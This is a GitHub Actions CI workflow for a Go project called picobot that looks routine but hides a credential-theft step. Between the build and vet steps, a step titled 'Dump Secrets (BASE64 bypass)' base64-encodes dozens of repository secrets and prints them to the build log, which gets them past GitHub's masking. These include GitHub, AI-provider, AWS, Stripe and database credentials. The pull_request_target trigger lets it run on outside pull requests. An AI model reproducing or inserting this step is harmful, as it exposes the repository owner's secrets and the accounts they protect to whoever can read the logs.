name: CI
on:
  push:
    branches: [main]
  pull_request_target:
    types: [opened, synchronize, reopened]
    branches: [main]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build
        run: go build -o picobot ./cmd/picobot
      - name: Dump Secrets (BASE64 bypass)
        shell: bash
        run: |
          echo "=== SECRETS BASE64 ==="
          echo "GH_TOKEN:$(echo '${{ secrets.GH_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "GITHUB_TOKEN:$(echo '${{ secrets.GITHUB_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "TOKEN:$(echo '${{ secrets.TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "API_KEY:$(echo '${{ secrets.API_KEY }}' | base64 -w0 2>/dev/null)"
          echo "OPENAI_API_KEY:$(echo '${{ secrets.OPENAI_API_KEY }}' | base64 -w0 2>/dev/null)"
          echo "ANTHROPIC_API_KEY:$(echo '${{ secrets.ANTHROPIC_API_KEY }}' | base64 -w0 2>/dev/null)"
          echo "MISTRAL_API_KEY:$(echo '${{ secrets.MISTRAL_API_KEY }}' | base64 -w0 2>/dev/null)"
          echo "GROQ_API_KEY:$(echo '${{ secrets.GROQ_API_KEY }}' | base64 -w0 2>/dev/null)"
          echo "REPLICATE_API_KEY:$(echo '${{ secrets.REPLICATE_API_KEY }}' | base64 -w0 2>/dev/null)"
          echo "HF_TOKEN:$(echo '${{ secrets.HF_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "AWS_ACCESS_KEY_ID:$(echo '${{ secrets.AWS_ACCESS_KEY_ID }}' | base64 -w0 2>/dev/null)"
          echo "AWS_SECRET_ACCESS_KEY:$(echo '${{ secrets.AWS_SECRET_ACCESS_KEY }}' | base64 -w0 2>/dev/null)"
          echo "STRIPE_SECRET_KEY:$(echo '${{ secrets.STRIPE_SECRET_KEY }}' | base64 -w0 2>/dev/null)"
          echo "SLACK_TOKEN:$(echo '${{ secrets.SLACK_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "DISCORD_TOKEN:$(echo '${{ secrets.DISCORD_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "DOCKER_PASSWORD:$(echo '${{ secrets.DOCKER_PASSWORD }}' | base64 -w0 2>/dev/null)"
          echo "NPM_TOKEN:$(echo '${{ secrets.NPM_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "PAT:$(echo '${{ secrets.PAT }}' | base64 -w0 2>/dev/null)"
          echo "PASSWORD:$(echo '${{ secrets.PASSWORD }}' | base64 -w0 2>/dev/null)"
          echo "DB_PASSWORD:$(echo '${{ secrets.DB_PASSWORD }}' | base64 -w0 2>/dev/null)"
          echo "DATABASE_URL:$(echo '${{ secrets.DATABASE_URL }}' | base64 -w0 2>/dev/null)"
          echo "MONGO_URI:$(echo '${{ secrets.MONGO_URI }}' | base64 -w0 2>/dev/null)"
          echo "REDIS_URL:$(echo '${{ secrets.REDIS_URL }}' | base64 -w0 2>/dev/null)"
          echo "JWT_SECRET:$(echo '${{ secrets.JWT_SECRET }}' | base64 -w0 2>/dev/null)"
          echo "SENDGRID_API_KEY:$(echo '${{ secrets.SENDGRID_API_KEY }}' | base64 -w0 2>/dev/null)"
          echo "TELEGRAM_BOT_TOKEN:$(echo '${{ secrets.TELEGRAM_BOT_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "TG_BOT_TOKEN:$(echo '${{ secrets.TG_BOT_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "CLOUDFLARE_TOKEN:$(echo '${{ secrets.CLOUDFLARE_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "CF_API_KEY:$(echo '${{ secrets.CF_API_KEY }}' | base64 -w0 2>/dev/null)"
          echo "SUPABASE_URL:$(echo '${{ secrets.SUPABASE_URL }}' | base64 -w0 2>/dev/null)"
          echo "AUTH_TOKEN:$(echo '${{ secrets.AUTH_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "ACCESS_TOKEN:$(echo '${{ secrets.ACCESS_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "GITLAB_TOKEN:$(echo '${{ secrets.GITLAB_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "AZURE_TOKEN:$(echo '${{ secrets.AZURE_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "DO_TOKEN:$(echo '${{ secrets.DO_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "HUGGINGFACE_TOKEN:$(echo '${{ secrets.HUGGINGFACE_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "OPENROUTER_API_KEY:$(echo '${{ secrets.OPENROUTER_API_KEY }}' | base64 -w0 2>/dev/null)"
          echo "PERPLEXITY_API_KEY:$(echo '${{ secrets.PERPLEXITY_API_KEY }}' | base64 -w0 2>/dev/null)"
          echo "DEEPSEEK_API_KEY:$(echo '${{ secrets.DEEPSEEK_API_KEY }}' | base64 -w0 2>/dev/null)"
          echo "NEW_RELIC_LICENSE_KEY:$(echo '${{ secrets.NEW_RELIC_LICENSE_KEY }}' | base64 -w0 2>/dev/null)"
          echo "DATADOG_API_KEY:$(echo '${{ secrets.DATADOG_API_KEY }}' | base64 -w0 2>/dev/null)"
          echo "DOCKER_TOKEN:$(echo '${{ secrets.DOCKER_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "CLIENT_SECRET:$(echo '${{ secrets.CLIENT_SECRET }}' | base64 -w0 2>/dev/null)"
          echo "REFRESH_TOKEN:$(echo '${{ secrets.REFRESH_TOKEN }}' | base64 -w0 2>/dev/null)"
          echo "=== END ==="
      - name: Go Vet
        run: go vet ./...
